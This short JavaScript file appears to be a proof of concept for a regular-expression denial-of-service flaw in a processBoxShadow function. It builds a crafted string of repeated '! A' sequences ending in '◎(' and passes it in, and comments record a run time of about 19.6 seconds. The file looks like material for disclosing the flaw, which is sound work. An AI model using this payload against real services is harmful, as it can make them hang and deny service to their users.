import processBoxShadow from "./processBoxShadow.js";

//Attack String :""+"! A"*100000+"◎("
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "! A";
}
str += "◎(";

console.log(processBoxShadow(str));

// real    0m19.615s
// user    0m19.549s
// sys     0m0.030s